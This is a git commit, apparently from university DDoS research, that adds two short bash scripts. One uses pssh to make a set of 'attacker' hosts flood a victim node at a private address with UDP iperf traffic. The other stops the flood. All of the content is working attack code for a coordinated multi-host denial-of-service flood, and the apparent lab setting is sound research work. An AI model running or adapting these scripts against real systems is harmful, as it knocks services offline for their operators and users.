c75c330394d7c21b889929b1460331af91fb0119
christiankiller <christian.killer@uzh.ch>
2018-10-11 20:34:43 +0200

    Simple bash scripts to launch ddos attacks by using iperf

---
+++ attack-start.sh
@@ -0,0 +1,3 @@
+#!/usr/bin/env bash
+echo "attacking victim node604"
+pssh -i -h ~/.pssh_attackers "iperf -c 192.168.60.5 -u -b 20m -t 120 -i 1 -p 5000"
---
+++ attack-stop.sh
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+pssh -i -h ~/.pssh_attackers "sudo killall iperf"
